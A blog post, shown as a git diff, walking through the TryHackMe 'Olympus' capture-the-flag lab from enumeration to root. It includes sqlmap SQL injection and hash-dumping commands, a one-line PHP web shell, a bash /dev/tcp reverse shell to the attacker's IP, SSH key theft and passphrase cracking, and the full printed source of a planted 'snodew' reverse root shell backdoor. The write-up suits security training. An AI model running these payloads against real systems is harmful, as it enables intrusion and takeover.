@@ -1,0 +1,243 @@
+---
+layout: post
+title:  "Olympus (THM)"
+date:   2025-08-01 19:48:43 -0400
+author: robo.uzi
+tags: [CTF, TryHackMe]
+---
+
+Prompt: Hey! Start the VM and start enumerating! Bruteforcing against any login page is out of scope and should not be used. Well... Happy hacking ^^ -Petit Prince
+
+## Initial Compromise
+
+`nmap -p- -T5 -vv 10.10.86.234 -oN olympusfullnmap.txt`
+`nmap -sVC -p 22,80 -vv -T4 10.10.86.234 -oN olympusnmap.txt`:
+```shell
+PORT   STATE SERVICE REASON  VERSION  
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)  
+80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))  
+| http-methods:    
+|_  Supported Methods: GET HEAD POST OPTIONS  
+|_http-favicon: Unknown favicon MD5: ED726E098473BFA7523153F761D2232F  
+|_http-server-header: Apache/2.4.41 (Ubuntu)  
+|_http-title: Olympus  
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Add `olympus.thm` to the `/etc/hosts` file. I find on `http://olympus.thm/` I can drag and drop files onto the page. 
+
+```shell
+ffuf -u http://olympus.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,,.zip,.conf,.log,.sql,.js,.json,.xml -mc 200,301,302,403 -fs 276 -t 50
+
+~webmaster     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 217ms] 
+index.php      [Status: 200, Size: 1948, Words: 238, Lines: 48, Duration: 225ms] 
+javascript     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 212ms] 
+static         [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 332ms]
+```
+I'm not sure how the file drag and drop is functioning. `.txt` files are displayed on the page. Files like `.php` and `.sh` prompt me to download the file or open it. I start exploring `http://olympus.thm/~webmaster/`. It says `Victor CMS` and it is running `php`. 
+
+```shell
+ffuf -u http://olympus.thm/~webmaster/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,,.zip,.conf,.log,.sql,.js,.json,.xml -mc 200,301,302,403 -fs 276 -t 50
+
+admin         [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 217ms]  
+category.php  [Status: 200, Size: 6650, Words: 1869, Lines: 160, Duration:302ms] 
+css           [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 215ms]  
+fonts         [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 
+img           [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 221ms]  
+includes      [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 215ms]  
+index.php     [Status: 200, Size: 9386, Words: 2340, Lines: 198, Duration:221ms]
+js            [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 217ms]  
+LICENSE       [Status: 200, Size: 1070, Words: 153, Lines: 22, Duration: 212ms]  
+search.php    [Status: 200, Size: 6621, Words: 1865, Lines: 164, Duration: 219ms]
+```
+
+Its using `Victor CMS v1.0` so I go to `https://www.exploit-db.com/exploits/48734` to look for possible exploits. I find one and try it:
+````shell
+sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
+
+available databases [6]:  
+[*] information_schema  
+[*] mysql  
+[*] olympus  
+[*] performance_schema  
+[*] phpmyadmin  
+[*] sys
+
+sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --dump --random-agent -v 3
+
+| user_id | randsalt | user_name  | user_role | user_email | user_image | user_lastname | user_password | user_firstname |  
+
+|3|<blank>| prometheus | User | prometheus@olympus.thm |<blank>|<blank>| $2y$10$hash | prometheus |
+
+|6| dgas | root | Admin | root@chat.olympus.thm  |<blank>|<blank>| $2y$10$hash | root |
+
+|7 | dgas | zeus | User | zeus@chat.olympus.thm |<blank>|<blank>| $2y$10$hash | zeus |
+
++---------------------------+  
+| flag                      |  
++---------------------------+  
+| flag{...}                 |  
++---------------------------+
+
++------------+--------------------------------------+
+Chats
++------------+--------------------------------------+  
+| 2022-04-05 | Attached : prometheus_password.txt                             
+| prometheus | 47c3210d51761....txt                 |  
+| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I cant download it back... | prometheus | <blank>                              |  
+| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. Hes still working on it.  
+| zeus       | <blank>                              |
++------------+--------------------------------------+ 
+````
+This got me the first flag and lot's of good info including emails `prometheus@olympus.thm`, `root@chat.olympus.thm`, and `zeus@chat.olympus.thm`
+
+I save the hashes to a file and run `/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` and get the password `...` from one of the hashes.
+
+I login with `...` and land at `http://olympus.thm/~webmaster/admin/`.
+
+I run this now in case Im missing anything:
+```shell
+ffuf -u http://olympus.thm/~webmaster/admin/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,,.zip,.conf,.log,.sql,.js,.json,.xml -mc 200,301,302,403 -fs 276 -t 50
+
+categories.php [Status: 302, Size:10239, Words:4126, Lines:241, Duration: 222ms] 
+comment.php  [Status: 302, Size: 7778, Words: 2637, Lines: 196, Duration: 231ms] 
+css          [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 219ms]  
+fonts        [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 213ms]  
+function.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 317ms]
+img          [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 211ms]  
+includes     [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 212ms]  
+index.php   [Status: 302, Size: 11408, Words: 5172, Lines: 260, Duration: 222ms] 
+js           [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 216ms]
+posts.php    [Status: 302, Size: 9686, Words: 2942, Lines: 222, Duration: 225ms] 
+profile.php  [Status: 302, Size: 7410, Words: 2180, Lines: 199, Duration: 219ms]
+users.php    [Status: 302, Size: 9070, Words: 2725, Lines: 205, Duration: 224ms]
+```
+
+I run `searchsploit "Victor CMS 1.0"` and find `The GET parameter '/admin/users.php?source=add_user' is vulnerable Arbitary File Uploads`. It seems this was patched as I can't seem to upload to `http://olympus.thm/~webmaster/admin/img/`. I can read here but not write. 
+
+After a while I notice the admin and zeus emails are `chat.olympus.thm`. I add that to my `/etc/hosts` and land at `http://chat.olympus.thm/login.php`. I login with the same credentials `...`.
+
+```shell
+ffuf -u http://chat.olympus.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.zip,.conf,.log,.js,.json,.xml -mc 200,301,302,403 -fs 281 -t 50
+
+config.php    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 208ms]  
+home.php      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 216ms]  
+index.php     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 218ms]  
+javascript    [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 227ms] 
+login.php     [Status: 200, Size: 1577, Words: 345, Lines: 42, Duration: 215ms]  
+logout.php    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 219ms]  
+static        [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 218ms]  
+upload.php    [Status: 200, Size: 112, Words: 18, Lines: 1, Duration: 217ms]  
+uploads       [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 219ms]
+```
+
+I visit `http://chat.olympus.thm/uploads/47c3210d51761686f3af40a875eeaaea.txt` and it says `you really thought it would be this easy ?!`.
+
+It seems I can upload any type of file I want so uploading a shell is easy. But accessing it is hard because they obfuscate the name in some way. I try to generate an `md5sum` and use that but it doesnt work. 
+
+I can use the sql injection to dump the chat table of the app.
+
+To be able to see the files I just uploaded I need to add the flag `--fresh-queries`:
+```shell
+sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus -T chats --dump --random-agent -v 3 --fresh-queries
+
+| 2025-07-27 | SHELL                                                     
+| prometheus | <blank>                              |  
+| 2025-07-27 | Attached : shell.php      
+| prometheus | 000007bc943b38bd058d5b9827f789e5.php |
+```
+
+I access `http://chat.olympus.thm/uploads/000007bc943b38bd058d5b9827f789e5.php?cmd=id` and see I have RCE. This is because I made my reverse shell php code like this:     `<?php system($_GET['cmd']); ?>`.
+
+___
+## Privilege Escalation
+
+I set my listener like `nc -lvnp 4444` and visit the link `http://chat.olympus.thm/uploads/000007bc943b38bd058d5b9827f789e5.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.13.66.123/4444%200%3E%261%27'`.
+
+I catch the shell and fix it with:
+```shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+CTRL+Z
+stty raw -echo; fg
+```
+
+In `/home/zeus` I find `zeus.flag` and `zeus.txt` which contains:
+```shell
+Hey zeus !  
+I managed to hack my way back into the olympus eventually.  
+Looks like the IT kid messed up again !  
+Ive now got a permanent access as a super user to the olympus.
+	- Prometheus.
+```
+Linpeas marked it as vulnerable to `CVE-2021-3560`.
+
+`sudo -l` doesnt work. I check for `suids` with `find / -perm /u=s -type f 2>/dev/null` and I see `/usr/bin/cputils` which normally isnt there. I run `/usr/bin/cputils --help` and it just prompts me to enter a file. I enter `/etc/passwd` and enter a file name. It saves it to a file. So I can read files with this. I try to do it with `/etc/shadow` and it says "Error Occured!". I run `/usr/bin/cputils` and enter `/home/zeus/.ssh/id_rsa` and save it to `id_rsa`.
+
+I copy the private key to my machine with `python3 -m http.server` then `wget http://10.10.62.109:8000/id_rsa`. 
+
+I run `chmod 600 id_rsa` and finally `ssh -i id_rsa zeus@10.10.62.109` to log in. I find it has a passphrase so I run `python3 ssh2john.py id_rsa > id_rsa.hash` and then `/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash` and discover the passphrase is `...`.
+
+Now I'm zeus I search for suids again with `find / -perm /u=s -type f 2>/dev/null`. It returns nothing helpful. I return to the hint from earlier about leaving "permanent access as a super user". Inside `/var/www/html/...` I find:
+```shell
+cat VIGQFQFMYOST.php  
+<?php  
+$pass = "...";  
+if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');  
+  
+set_time_limit(0);  
+  
+$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
+if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");  
+
+$ip = $_GET["ip"]; $port = $_GET["port"];  
+
+$write_a = null;  
+$error_a = null;  
+  
+$suid_bd = "/lib/defended/libc.so.99";  
+$shell = "uname -a; w; $suid_bd";  
+  
+chdir("/"); umask(0);  
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);  
+if(!$sock) die("couldn't open socket");  
+  
+$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));  
+$proc = proc_open($shell, $fdspec, $pipes);  
+  
+if(!is_resource($proc)) die();  
+  
+for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);  
+stream_set_blocking($sock, 0);  
+  
+while(1)  
+{  
+   if(feof($sock) || feof($pipes[1])) break;  
+   $read_a = array($sock, $pipes[1], $pipes[2]);  
+   $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);  
+   if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }  
+   if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }  
+   if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }  
+}  
+  
+fclose($sock);  
+for($x=0;$x<=2;$x++) fclose($pipes[x]);  
+proc_close($proc);  
+?>
+```
+To connect as root using this script I first start my netcat listener `nc -lvp 4444`. 
+
+I then need to navigate to `http://10.10.62.109/redacted/VIGQFQFMYOST.php` and supply the password from the script.
+
+I login and see this:
+```text
+snodew reverse root shell backdoor
+
+Usage:
+Locally: nc -vlp [port]  
+Remote: 10.10.62.109/redacted/VIGQFQFMYOST.php?ip=[destination of listener]&port=[listening port]
+```
+
+I catch the shell, stabalize it, and get the remaining 2 flags at `/root/root.flag`, and find the last one with `grep -ri "flag{" /etc 2>/dev/null`. The end!
+
+___
